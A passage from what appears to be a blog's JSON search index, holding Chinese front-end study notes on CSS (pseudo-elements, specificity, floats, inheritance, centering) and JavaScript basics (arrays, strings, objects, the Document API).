::after 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空&quot;&quot;）。\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;style>\n        p.one::after &#123;\n            content:\"\";\n            display: inline-block;\n            width: 50px;\n            height: 10px;\n            background: blue;\n        &#125;\n        p.two::after &#123;\n            content:\"要插入的内容\";\n            color: red;\n            font-size: 6px;\n        &#125;\n        p.three::after &#123;\n            content: url('./smiley.gif');\n            position: relative;\n            top: 8px;\n        &#125;\n    &lt;/style>\n&lt;/head>\n&lt;body>\n    &lt;p class=\"one\">伪元素 ::after&lt;/p>\n    &lt;p class=\"two\">伪元素 ::after&lt;/p>\n    &lt;p class=\"three\">伪元素 ::after&lt;/p>\n&lt;/body>\n&lt;/html>\n\n\n2. ::before伪元素 ::before 能够在指定元素的前面插入一些内容。与 ::after 相似，::before 中也需要使用 content 属性来定义要追加的内容，而且在 ::before 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空&quot;&quot;）。\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;style>\n        p.one::before &#123;\n            content:\"\";\n            display: inline-block;\n            width: 50px;\n            height: 10px;\n            background: blue;\n        &#125;\n        p.two::before &#123;\n            content:\"要插入的内容\";\n            color: red;\n            font-size: 6px;\n        &#125;\n        p.three::before &#123;\n            content: url('./smiley.gif');\n            position: relative;\n            top: 8px;\n        &#125;\n    &lt;/style>\n&lt;/head>\n&lt;body>\n    &lt;p class=\"one\">伪元素 ::before&lt;/p>\n    &lt;p class=\"two\">伪元素 ::before&lt;/p>\n    &lt;p class=\"three\">伪元素 ::before&lt;/p>\n&lt;/body>\n&lt;/html>\n\n\n3. ::first-letter伪元素 ::first-letter 用来设置指定元素中内容第一个字符的样式，通常用来配合 font-size 和 float 属性制作首字下沉效果。需要注意的是，伪元素 ::first-letter 仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。\n下面通过示例来演示伪元素 ::first-letter 的使用：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;style>\n        p::first-letter&#123;\n            font-size: 2em;\n            color: blue;\n        &#125;\n    &lt;/style>\n&lt;/head>\n&lt;body>\n    &lt;p>伪元素 ::first-letter&lt;/p>\n&lt;/body>\n&lt;/html>\n\n\n4. ::first-line伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。\n下面通过示例来演示伪元素 ::first-line 的使用：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;style>\n        p::first-line&#123;\n            font-size: 1.5em;\n            color: blue;\n            font-weight: bold;\n        &#125;\n    &lt;/style>\n&lt;/head>\n&lt;body>\n    &lt;p>伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。&lt;/p>\n&lt;/body>\n&lt;/html>\n\n\n5. ::selection伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。\n下面通过示例来演示伪元素 ::selection 的使用：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;style>\n        p::selection&#123;\n            color: red;\n            background-color: #CCC;\n        &#125;\n    &lt;/style>\n&lt;/head>\n&lt;body>\n    &lt;p>伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。 &lt;/p>\n&lt;/body>\n&lt;/html>\n\n运行结果如下图所示：\n图：伪元素 ::selection 的使用\n6. ::placeholder伪元素 ::placeholder 用来设置表单元素（input、textarea 元素）的占位文本（通过 HTML 的 placeholder 属性设置的文本），示例代码如下：\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;style&gt;\n        input.text::placeholder&#123;\n            color: red;\n            background-color: #CCC;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n    &lt;input placeholder&#x3D;&quot;请输入一段文本&quot;&gt;未使用伪元素 ::placeholder&lt;br&gt;\n    &lt;input placeholder&#x3D;&quot;请输入一段文本&quot; class&#x3D;&quot;text&quot;&gt;使用伪元素 ::placeholder 的效果\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n运行结果如下图所示：\n\n4、圆角border-radius\n\n5、浮动和清除浮动清除浮动:\n父元素内联块元素 inline-block\n\n.father&#123;\n display:inline-block\n&#125;\n\n6、固定定位position:fixed\n\n\n\n7、CSS单位（一）em和rem简单的说\n\nem: 就是字体大小，根据元素自身的字体大小来定，如果自身没有定义字体大小，则继承父元素的字体大小，即1em &#x3D; 1 font-size;\nrem: 和em差不多，可以看成是root-em，是根据根元素的字体大小来定义的，即html设置的字体大小来定义，默认html的字体大小是16px；\n\n8、继承相关css的继承：就是给父级设置一些属性，子级继承了父级的该属性，这就是我们的css中的继承。 官方解释，继承是一种规则，它允许样式不仅应用于特定的html标签元素，而且应用于其后代元素。\n无继承性的属性\n1、display：规定元素应该生成的框的类型\n2、文本属性：\nvertical-align：垂直文本对齐\ntext-decoration：规定添加到文本的装饰\ntext-shadow：文本阴影效果\nwhite-space：空白符的处理\nunicode-bidi：设置文本的方向\n3、盒子模型的属性：width、height、margin 、margin-top、margin-right、margin-bottom、margin-left、border、 border-style、border-top-style、border-right-style、border-bottom-style、border-left-style、border-width、border-top-width、border-right-right、border-bottom-width、border-left-width、border-color、border-top-color、border-right-color、border-bottom-color、border-left-color、border-top、border-right、border-bottom、border-left、padding、padding-top、padding-right、padding-bottom、padding-left\n4、背景属性：background、background-color、background-image、background-repeat、background-position、background-attachment\n5、定位属性：float、clear、position、top、right、bottom、left、min-width、min-height、max-width、max-height、overflow、clip、z-index\n6、生成内容属性：content、counter-reset、counter-increment\n7、轮廓样式属性：outline-style、outline-width、outline-color、outline\n8、页面样式属性：size、page-break-before、page-break-after\n9、声音样式属性：pause-before、pause-after、pause、cue-before、cue-after、cue、play-during\n有继承性的属性\n1、字体系列属性\nfont：组合字体\nfont-family：规定元素的字体系列\nfont-weight：设置字体的粗细\nfont-size：设置字体的尺寸\nfont-style：定义字体的风格\nfont-variant：设置小型大写字母的字体显示文本，这意味着所有的小写字母均会被转换为大写，但是所有使用小型大写 字体的字母与其余文本相比，其字体尺寸更小。\nfont-stretch：对当前的 font-family 进行伸缩变形。所有主流浏览器都不支持。\nfont-size-adjust：为某个元素规定一个 aspect 值，这样就可以保持首选字体的 x-height。\n2、文本系列属性\ntext-indent：文本缩进\ntext-align：文本水平对齐\nline-height：行高\nword-spacing：增加或减少单词间的空白（即字间隔）\nletter-spacing：增加或减少字符间的空白（字符间距）\ntext-transform：控制文本大小写\ndirection：规定文本的书写方向\ncolor：文本颜色 a元素除外\n3、元素可见性：visibility\n4、表格布局属性：caption-side、border-collapse、border-spacing、empty-cells、table-layout\n5、列表布局属性：list-style-type、list-style-image、list-style-position、list-style\n6、生成内容属性：quotes\n7、光标属性：cursor\n8、页面样式属性：page、page-break-inside、windows、orphans\n9、声音样式属性：speak、speak-punctuation、speak-numeral、speak-header、speech-rate、volume、voice-family、 pitch、pitch-range、stress、richness、、azimuth、elevation\n所有元素可以继承的属性\n1、元素可见性：visibility\n2、光标属性：cursor\n内联元素可以继承的属性\n1、字体系列属性\n2、除text-indent、text-align之外的文本系列属性\n块级元素可以继承的属性\n1、text-indent、text-align\n9、css预处理工具参考答案：\nCSS 预处理器是一个能让你通过预处理器自己独有的语法来生成CSS的程序。\ncss预处理器种类繁多，三种主流css预处理器是Less、Sass（Scss）及Stylus；它们各自的背景如下:\nSass：\n2007年诞生，最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS（SCSS 需要使用分号和花括号而不是换行和缩进）。\nLess：\n2009年出现，受SASS的影响较大，但又使用CSS的语法，让大部分开发者和设计师更容易上手，在ruby社区之外支持者远超过SASS。其缺点是比起SASS来，可编程功能不够。优点是简单和兼容CSS，反过来也影响了SASS演变到了SCSS的时代，著名的Twitter Bootstrap就是采用LESS做底层语言的。\nStylus：\n2010年产生，来自Node.js社区，主要用来给Node项目进行CSS预处理支持，在此社区之内有一定支持者，在广泛的意义上人气还完全不如SASS和LESS。\n比较\n在使用 CSS 预处理器之前最重要的是理解语法，幸运的是基本上大多数预处理器的语法跟 CSS 都差不多。\n首先 Sass 和 Less 都使用的是标准的 CSS 语法，因此如果可以很方便的将已有的 CSS 代码转为预处理器代码，默认 Sass 使用 .sass 扩展名，而 Less 使用 .less 扩展名。\nh1 &#123;\n  color: #0982C1;\n&#125;\n\n这是一个再普通不过的，不过 Sass 同时也支持老的语法，就是不包含花括号和分号的方式：\nh1\ncolor: #0982c1\n\n而 Stylus 支持的语法要更多样性一点，它默认使用 .styl 的文件扩展名，下面是 Stylus 支持的语法\n/* style.styl */\nh1 &#123;\n  color: #0982C1;\n&#125;\n/* omit brackets */\nh1\ncolor: #0982C1;\n/* omit colons and semi-colons */\nh1\ncolor #0982C1\n\n可以在同一个样式单中使用不同的变量，例如下面的写法也不会报错：\nh1 &#123;\n  color #0982c1\n&#125;\nh2\nfont-size: 1.2em\n\n\n\n10、行内元素和块级元素什么区别，然后怎么相互转换参考答案:\n块级元素\n1.总是从新的一行开始，即各个块级元素独占一行，默认垂直向下排列；\n2.高度、宽度、margin及padding都是可控的，设置有效，有边距效果；\n3.宽度没有设置时，默认为100%；\n4.块级元素中可以包含块级元素和行内元素。\n行内元素\n1.和其他元素都在一行，即行内元素和其他行内元素都会在一条水平线上排列；\n2.高度、宽度是不可控的，设置无效，由内容决定。\n3.根据标签语义化的理念，行内元素最好只包含行内元素，不包含块级元素。\n转换\n当然块级元素与行内元素之间的特性是可以相互转换的。HTML可以将元素分为行内元素、块状元素和行内块状元素三种。\n使用display属性能够将三者任意转换：\n(1)display:inline;转换为行内元素；\n(2)display:block;转换为块状元素；\n(3)display:inline-block;转换为行内块状元素。\n11、样式优先级参考答案：\n样式类型\n样式类型分为三类\n\n行间\n\n&lt;h1 style=\"font-size:12px;color:#000;\">我的行间CSS样式。&lt;/h1>\n\n\n内联\n\n&lt;style type=\"text/css\">\n   h1&#123;font-size:12px;\n      color:#000;\n      &#125;\n&lt;/style>\n\n\n外部\n\n&lt;link rel=\"stylesheet\" href=\"css/style.css\">\n\n选择器类型\n\n1、ID　　#id\n2、class　　.class\n3、标签　　p\n4、通用　　*\n5、属性　　[type&#x3D;”text”]\n6、伪类　　:hover\n7、伪元素　　::first-line\n8、子选择器、相邻选择器\n\n权重计算规则\n第一等：代表内联样式，如: style&#x3D;””，权值为1000。第二等：代表ID选择器，如：#content，权值为0100。第三等：代表类，伪类和属性选择器，如.content，权值为0010。第四等：代表类型选择器和伪元素选择器，如div p，权值为0001。通配符、子选择器、相邻选择器等的。如*、&gt;、+,权值为0000。继承的样式没有权值。\n比较规则\n遵循如下法则：\n\n选择器都有一个权值，权值越大越优先；\n当权值相等时，后出现的样式表设置要优于先出现的样式表设置；\n创作者的规则高于浏览者：即网页编写者设置的 CSS 样式的优先权高于浏览器所设置的样式；\n继承的 CSS 样式不如后来指定的 CSS 样式；\n在同一组属性设置中标有!important规则的优先级最大\n通配符、子选择器、相邻选择器等的。虽然权值为0000，但是也比继承的样式优先。\n\n！important\n\n!important 的作用是提升优先级，换句话说。加了这句的样式的优先级是最高的（比内联样式的优先级还高)。\n\n&lt;style> \np&#123;\n    color:red !important;\n&#125; \n&lt;/style>\n&lt;p style=\"color:blue;\">我显示红色&lt;/p>\n\n\nie7+和别的浏览器对important的这种作用的支持度都很好。只有ie6有些bug\n\np&#123;\n      color:red !important;\n      color:blue;    \n &#125;//会显示blue\n\n但是这并不说明ie6不支持important，只是支持上有些bug。看下面\np&#123;\n     color:red !important;  \n&#125;\np&#123;\n    color:blue;  \n&#125; //这样就会显示的是red。说明ie6还是支持important的。&lt;/pre>\n\n12、盒子塌陷是什么？参考答案：\n盒子塌陷\n本应该在父盒子内部的元素跑到了外部。\n原因：\n当父元素没设置足够大小的时候，而子元素设置了浮动的属性，子元素就会跳出父元素的边界（脱离文档流），尤其是当父元素的高度为auto时，而父元素中又没有其它非浮动的可见元素时，父盒子的高度就会直接塌陷为零， 我们称这是CSS高度塌陷。\n关于盒子塌陷的几种解决方法\n（1）最简单，直接，粗暴的方法就是盒子大小写死，给每个盒子设定固定的width和height，直到合适为止，这样的好处是简单方便，兼容性好，适合只改动少量内容不涉及盒子排布的版面。缺点是非自适应，浏览器的窗口大小直接影响用户体验。\n（2）给外部的父盒子也添加浮动，让其也脱离标准文档流，这种方法方便，但是对页面的布局不是很友好，不易维护。\n（3）给父盒子添加overflow属性。\n overflow:auto; 有可能出现滚动条，影响美观。\n overflow:hidden; 可能会带来内容不可见的问题。\n（4）父盒子里最下方引入清除浮动块。最简单的有：\n&lt;br style=\"clear:both;\"/>\n\n有很多人是这么解决的，但是我们并不推荐，因为其引入了不必要的冗余元素 。\n (5)用after伪元素清除浮动\n给外部盒子的after伪元素设置clear属性，再隐藏它\n这其实是对空盒子方案的改进，一种纯CSS的解决方案，不用引入冗余元素。\n.clearfix &#123;*zoom: 1;&#125;\n\n.clearfix:before,.clearfix:after &#123;\n\ndisplay: table;\n\nline-height: 0;\n\ncontent: \"\";\n\n&#125;\n\n.clearfix:after &#123;clear: both;&#125;\n\n这也是bootstrap框架采用的清除浮动的方法。\n这是一种纯CSS的解决浮动造成盒子塌陷方法，没有引入任何冗余元素，推荐使用此方法来解决CSS盒子塌陷。\n备注：第五种方法虽好，但是低版本IE不兼容，具体选择哪种解决方法，可根据实际情况决定。\n(6) 给父盒子添加border\n(7) 给父盒子设置padding-top\n13、css 伪类与伪元素区别参考答案：\n\n伪类(pseudo-classes)\n\n\n其核⼼就是⽤来选择DOM树之外的信息,不能够被普通选择器选择的⽂档之外的元素，⽤来添加⼀些选择器的特殊效果。\n⽐如:hover :active :visited :link :visited :first-child :focus :lang等\n由于状态的变化是⾮静态的，所以元素达到⼀个特定状态时，它可能得到⼀个伪类的样式；当状态改变时，它⼜会失去这个样式。\n由此可以看出，它的功能和class有些类似，但它是基于⽂档之外的抽象，所以叫 伪类。\n\n\n伪元素(Pseudo-elements)\n\n\nDOM树没有定义的虚拟元素\n核⼼就是需要创建通常不存在于⽂档中的元素，\n⽐如::before ::after 它选择的是元素指定内容，表示选择元素内容的之前内容或之后内容。\n伪元素控制的内容和元素是没有差别的，但是它本身只是基于元素的抽象，并不存在于⽂档中，所以称为伪元素。⽤于将特殊的效果添加到某些选择器\n\n\n伪类与伪元素的区别\n\n\n表示⽅法\nCSS2 中伪类、伪元素都是以单冒号:表示,\nCSS2.1 后规定伪类⽤单冒号表示,伪元素⽤双冒号::表示，\n浏览器同样接受 CSS2 时代已经存在的伪元素(:before, :after, :first�line, :first-letter 等)的单冒号写法。\nCSS2 之后所有新增的伪元素(如::selection)，应该采⽤双冒号的写法。\nCSS3中，伪类与伪元素在语法上也有所区别，伪元素修改为以::开头。浏览器对以:开头的伪元素也继续⽀持，但建议规范书写为::开头\n\n\n定义不同\n伪类即假的类，可以添加类来达到效果\n伪元素即假元素，需要通过添加元素才能达到效果\n\n\n总结:\n伪类和伪元素都是⽤来表示⽂档树以外的”元素”。\n伪类和伪元素分别⽤单冒号:和双冒号::来表示。\n伪类和伪元素的区别，关键点在于如果没有伪元素(或伪类)，\n是否需要添加元素才能达到效果，如果是则是伪元素，反之则是伪类\n伪类和伪元素都不出现在源⽂件和DOM树中。也就是说在html源⽂件中是看不到伪类和伪元素的。\n伪类其实就是基于普通DOM元素⽽产⽣的不同状态，他是DOM元素的某⼀特征。\n伪元素能够创建在DOM树中不存在的抽象对象，⽽且这些抽象对象是能够访问到的。\n\n\n\n14、行内元素的margin 和 padding参考答案：\n\n水平方向：水平方向上，都有效；\n垂直方向：垂直方向上，都无效；（padding-top 和 padding-bottom 会显示出效果，但是高度不会撑开，不会对周围元素有影响）\n\n15、min-width&#x2F;max-width 和 min-height&#x2F;max-height 属性间的覆盖规则？参考答案：\n\nmax-width 会覆盖 width，即使 width 是行内样式或者设置了 !important。\nmin-width 会覆盖 max-width，此规则发生在 min-width 和 max-width 冲突的时候；\n\n16、未知高度元素垂直居中、水平居中的实现方式有哪些？参考答案：\n1、绝对定位+css3 transform:translate(-50%，-50%)\n.wrap&#123;\n  position:relative;\n&#125;\n.child&#123;\n  position: absolute;\n  top:50%;\n  left:50%;\n  -webkit-transform:translate(-50%,-50%);\n&#125;\n\n2、css3 的flex布局\n.wrap&#123;\n  display:flex;\n  justify-content:center;\n&#125;\n.child&#123;\n  align-self:center;\n&#125;\n\n3、table布局\n&lt;div class=\"wrap\">\n   &lt;div class=\"child\">\n          &lt;div>sadgsdgasgd&lt;/div>\n   &lt;/div>\n&lt;/div>\n.wrap&#123;\n  display:table;\n  text-align:center;\n&#125;\n.child&#123;\n  background:#ccc;\n  display:table-cell;\n  vertical-align:middle;\n&#125;\n.child div&#123;\n    width:300px;\n    height:150px;\n    background:red;\n    margin:0 auto;\n&#125;\n\n\n\n17.继承css属性分为继承属性和非继承属性\n继承属性的默认值为父元素的该属性的 计算值，非继承属性和根元素的继承属性的默认值为初始值。\n对于非继承属性，可以显示的声明属性值为 inherit，让子元素的属性继承父元素。\n常见的继承属性：​    字体 font 系列​            文本 text-align text-ident line-height letter-spacing​        颜色 color列表 list-style可见性 visibility光标 cursor\n18.什么是浮动，如何清除浮动？","slug":"重温前端-css篇","date":"2022-02-13T07:53:00.000Z","categories_index":"学习笔记,前端","tags_index":"CSS","author_index":"kif"},{"id":"1c758d147c4078e17f7ecc45f0df48d9","title":"重温前端-js篇","content":"Javascript1、JS中的instanceof运算符instanceof运算符用来判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上\nobj instanceof Object;&#x2F;&#x2F;true 实例obj在不在Object构造函数中\n\neg：\n请补全JavaScript函数，要求以Boolean的形式返回第一个参数是否属于第二个参数对象的实例。\nfunction _instanceof(left,right) &#123;\n    &#x2F;&#x2F; 补全代码\n    return (left instanceof right )\n    \n&#125;\n\n2、排序sort() 方法对数组的项目进行排序。\n按升序对数组中的数字进行排序：\nvar points &#x3D; [40, 100, 1, 5, 25, 10];\npoints.sort(function(a, b)&#123;return a-b&#125;);\n\n按降序对数组中的数字进行排序：\nvar points &#x3D; [40, 100, 1, 5, 25, 10];\npoints.sort(function(a, b)&#123;return b-a&#125;);\n\n3、JS字符串大写和小写之间的转换String 字符串大小写转换方法\n\n\n\n字符串方法\n说明\n\n\n\ntoLocaleLowerCase()\n把字符串转换成小写\n\n\ntoLocaleUpperCase()\n将字符串转换成大写\n\n\ntoLowerCase()\n将字符串转换成小写\n\n\ntoUpperCase()\n将字符串转换成大写\n\n\nvar s = \"JavaScript\";\nconsole.log(s.toUpperCase()); \n\n\n\n4、javascript如何删除指定数组元素\n使用delete关键字；\nvar colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;];\ndelete colors[0];\nconsole.log(colors); &#x2F;&#x2F; [undefined, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;]\n\n\n使用delete删除元素之后数组长度不变，只是被删除元素被置为undefined了\n\n使用splice()操作方法；\nvar colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];\nvar color &#x3D; colors.splice(0, 1);\nconsole.log(color); &#x2F;&#x2F; &quot;red&quot;\nconsole.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;]\n\n在删除数组元素的时候，它可以删除任意数量的项，只需要指定2个参数：要删除的第一项的位置和要删除的项数。\n\n迭代方法，用循环迭代数组元素，发现符合要删除的项则删除；\n第一种用最常见的ForEach循环来对比元素找到之后将其删除。\nvar colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];\ncolors.forEach(function(item, index, arr) &#123;    if(item &#x3D;&#x3D;&#x3D; &quot;red&quot;) &#123;\n        arr.splice(index, 1);\n    &#125;\n&#125;)\nvar colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];\ncolors &#x3D; colors.filter(function(item) &#123;    return item !&#x3D; &quot;red&quot;&#125;); \nconsole.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;]\n\n\n\nprototype原型方法，在Array的原型上添加方法来达到删除的目的。\n\n\n5、数组方法数组方法概括\n\n\n方法名\n对应版本\n功能\n原数组是否改变\n\n\n\nconcat()\nES5-\n合并数组，并返回合并之后的数据\nn\n\n\njoin()\nES5-\n使用分隔符，将数组转为字符串并返回\nn\n\n\npop()\nES5-\n删除最后一位，并返回删除的数据\ny\n\n\nshift()\nES5-\n删除第一位，并返回删除的数据\ny\n\n\nunshift()\nES5-\n在第一位新增一或多个数据，返回长度\ny\n\n\npush()\nES5-\n在最后一位新增一或多个数据，返回长度\ny\n\n\nreverse()\nES5-\n反转数组，返回结果\ny\n\n\nslice()\nES5-\n截取指定位置的数组，并返回\nn\n\n\nsort()\nES5-\n排序（字符规则），返回结果\ny\n\n\nsplice()\nES5-\n删除指定位置，并替换，返回删除的数据\ny\n\n\ntoString()\nES5-\n直接转为字符串，并返回\nn\n\n\nvalueOf()\nES5-\n返回数组对象的原始值\nn\n\n\nindexOf()\nES5\n查询并返回数据的索引\nn\n\n\nlastIndexOf()\nES5\n反向查询并返回数据的索引\nn\n\n\nforEach()\nES5\n参数为回调函数，会遍历数组所有的项，回调函数接受三个参数，分别为value，index，self；forEach没有返回值\nn\n\n\nmap()\nES5\n同forEach，同时回调函数返回数据，组成新数组由map返回\nn\n\n\nfilter()\nES5\n同forEach，同时回调函数返回布尔值，为true的数据组成新数组由filter返回\nn\n\n\nevery()\nES5\n同forEach，同时回调函数返回布尔值，全部为true，由every返回true\nn\n\n\nsome()\nES5\n同forEach，同时回调函数返回布尔值，只要由一个为true，由some返回true\nn\n\n\nreduce()\nES5\n归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduce返回\nn\n\n\nreduceRight()\nES5\n反向归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduceRight返回\nn\n\n\n用slice(0)复制一个数组\na.splice(index,0,item)：在数组a的第index位置插入item\n最大值 ;Math.max.apply(Math,array)\n6、对象Number 对象Number 对象是原始数值的包装对象，创建 Number 对象的语法格式如下：\nvar myNum &#x3D; new Number(value);\nvar myNum &#x3D; Number(value);\n\n其中 value 为要创建的 Number 对象的数值，若 value 为一个非数字的值，则会尝试将其转换为数字，若转换失败则会返回 NaN。\neg:请补全JavaScript函数，要求将数字参数转换为对象的形式返回。\nfunction _numbertoobject(number) &#123;\n    &#x2F;&#x2F; 补全代码\n    var myNum &#x3D; new Number(number);\n    return myNum\n    \n&#125;\n\n对象字符串JavaScript String 对象用于处理字符串，其中提供了大量操作字符串的方法，以及一些属性。\n创建 String 对象的语法格式如下：\nvar val &#x3D; new String(value);\nvar val &#x3D; String(value);\n\n\n\n\n\n\n\n\n\n\n\n\n\n对象属性遍历：\n使用 for in 循环遍历对象的属性时，原型链上的所有属性都将被访问：\nvar obj=&#123;\"name\":\"wjy\",\"age\":26,\"sex\":\"female\"&#125;;//定义一个object对象   \nvar keys=[];//定义一个数组用来接受key   \nvar values=[];//定义一个数组用来接受value   \n  for(var key in obj)&#123;   \n    keys.push(key);   \n    values.push(obj[key]);//取得value     \n    &#125;   \nalert(\"keys is ：\"+keys+\" and values is ：\"+values);  \n\n\n\nObject.keys(xx)&#x2F;Object.values(xx)\nconsole.log(Object.keys(obj));\nconsole.log(Object.values(obj));\n//输出：[\"name\", \"career\"]\n//输出：[ \"Poly\", \"it\"]\n\n添加属性//创建obj对象\n var obj = new Object();\n //为对象添加动态属性\n obj.userName = \"admin\";\n obj.passWord = \"123456\";\n //输出\n console.log(obj); \n\n删除对象属性//创建obj动态对象\nvar obj = new Object();\n//为对象添加动态属性\nobj.userName = \"admin\";\nobj.passWord = \"123456\";    \n//移除属性\ndelete obj.passWord;\nconsole.log(obj);\n\n\n\n7、字符串String 对象中的方法下表中列举了 String 对象中提供的方法及其描述信息：\n\n\n\n方法\n描述\n\n\n\nanchor()\n创建一个 HTML 锚点，即生成一个&lt;a&gt;标签，标签的 name 属性为 anchor() 方法中的参数\n\n\nbig()\n用大号字体显示字符串\n\n\nblink()\n显示闪动的字符串\n\n\nbold()\n使用粗体显示字符串\n\n\ncharAt()\n返回在指定位置的字符\n\n\ncharCodeAt()\n返回指定字符的 Unicode 编码\n\n\nconcat()\n拼接字符串\n\n\nfixed()\n以打字机文本显示字符串\n\n\nfontcolor()\n使用指定的颜色来显示字符串\n\n\nfontsize()\n使用指定的尺寸来显示字符串\n\n\nfromCharCode()\n将字符编码转换为一个字符串\n\n\nindexOf()\n检索字符串，获取给定字符串在字符串对象中首次出现的位置\n\n\nitalics()\n使用斜体显示字符串\n\n\nlastIndexOf()\n获取给定字符串在字符串对象中最后出现的位置\n\n\nlink()\n将字符串显示为链接\n\n\nlocaleCompare()\n返回一个数字，并使用该数字来表示字符串对象是大于、小于还是等于给定字符串\n\n\nmatch()\n根据正则表达式匹配字符串中的字符\n\n\nreplace()\n替换与正则表达式匹配的子字符串\n\n\nsearch()\n获取与正则表达式相匹配字符串首次出现的位置\n\n\nslice()\n截取字符串的片断，并将其返回\n\n\nsmall()\n使用小字号来显示字符串\n\n\nsplit()\n根据给定字符将字符串分割为字符串数组\n\n\nstrike()\n使用删除线来显示字符串\n\n\nsub()\n把字符串显示为下标\n\n\nsubstr()\n从指定索引位置截取指定长度的字符串\n\n\nsubstring()\n截取字符串中两个指定的索引之间的字符\n\n\nsup()\n把字符串显示为上标\n\n\ntoLocaleLowerCase()\n把字符串转换为小写\n\n\ntoLocaleUpperCase()\n把字符串转换为大写\n\n\ntoLowerCase()\n把字符串转换为小写\n\n\ntoUpperCase()\n把字符串转换为大写\n\n\ntoString()\n返回字符串\n\n\nvalueOf()\n返回某个字符串对象的原始值\n\n\n去除字符串左右两边的空格let str = \"   123   \";\nstr=str.trim(); // 123\n\n\n\n8、js 时间与时间戳的转换时间转时间戳：javascript获得时间戳的方法有四种，都是通过实例化时间对象 new Date() 来进一步获取当前的时间戳\nvar timetamp4 &#x3D; Number(new Date()) \n\n时间戳转时间function _date(number) &#123;\n  let date &#x3D; new Date(number);\n  let y &#x3D; date.getFullYear();\n  let m &#x3D; date.getMonth()+1;\n  let d &#x3D; date.getDate();\n  return (y + &quot;-&quot; + m + &quot;-&quot; + d);  \n&#125;\n\n9、Arguments 对象arguments 是一个对应于传递给函数的参数的类数组对象。\nfunction func1(a, b, c) &#123;\n  console.log(arguments[0]);\n  &#x2F;&#x2F; expected output: 1\n\n  console.log(arguments[1]);\n  &#x2F;&#x2F; expected output: 2\n\n  console.log(arguments[2]);\n  &#x2F;&#x2F; expected output: 3\n&#125;\n\nfunc1(1, 2, 3);\n\n\n\n10、Document 对象Document 对象属性和方法HTML文档中可以使用以下属性和方法:\n\n\n\n属性 &#x2F; 方法\n描述\n\n\n\ndocument.activeElement\n返回当前获取焦点元素\n\n\ndocument.addEventListener()\n向文档添加句柄\n\n\ndocument.adoptNode(node)\n从另外一个文档返回 adapded 节点到当前文档。\n\n\ndocument.anchors\n返回对文档中所有 Anchor 对象的引用。\n\n\ndocument.applets\n返回对文档中所有 Applet 对象的引用。注意: HTML5 已不支持  元素。\n\n\ndocument.baseURI\n返回文档的绝对基础 URI\n\n\ndocument.body\n返回文档的body元素\n\n\ndocument.close()\n关闭用 document.open() 方法打开的输出流，并显示选定的数据。\n\n\ndocument.cookie\n设置或返回与当前文档有关的所有 cookie。\n\n\ndocument.createAttribute()\n创建一个属性节点\n\n\ndocument.createComment()\ncreateComment() 方法可创建注释节点。\n\n\ndocument.createDocumentFragment()\n创建空的 DocumentFragment 对象，并返回此对象。\n\n\ndocument.createElement()\n创建元素节点。\n\n\ndocument.createTextNode()\n创建文本节点。\n\n\ndocument.doctype\n返回与文档相关的文档类型声明 (DTD)。\n\n\ndocument.documentElement\n返回文档的根节点\n\n\ndocument.documentMode\n返回用于通过浏览器渲染文档的模式\n\n\ndocument.documentURI\n设置或返回文档的位置\n\n\ndocument.domain\n返回当前文档的域名。\n\n\ndocument.domConfig\n已废弃。返回 normalizeDocument() 被调用时所使用的配置。\n\n\ndocument.embeds\n返回文档中所有嵌入的内容（embed）集合\n\n\ndocument.forms\n返回对文档中所有 Form 对象引用。\n\n\ndocument.getElementsByClassName()\n返回文档中所有指定类名的元素集合，作为 NodeList 对象。\n\n\ndocument.getElementById()\n返回对拥有指定 id 的第一个对象的引用。\n\n\ndocument.getElementsByName()\n返回带有指定名称的对象集合。\n\n\ndocument.getElementsByTagName()\n返回带有指定标签名的对象集合。\n\n\ndocument.images\n返回对文档中所有 Image 对象引用。\n\n\ndocument.implementation\n返回处理该文档的 DOMImplementation 对象。\n\n\ndocument.importNode()\n把一个节点从另一个文档复制到该文档以便应用。\n\n\ndocument.inputEncoding\n返回用于文档的编码方式（在解析时）。\n\n\ndocument.lastModified\n返回文档被最后修改的日期和时间。\n\n\ndocument.links\n返回对文档中所有 Area 和 Link 对象引用。\n\n\ndocument.normalize()\n删除空文本节点，并连接相邻节点\n\n\ndocument.normalizeDocument()\n删除空文本节点，并连接相邻节点的\n\n\ndocument.open()\n打开一个流，以收集来自任何 document.write() 或 document.writeln() 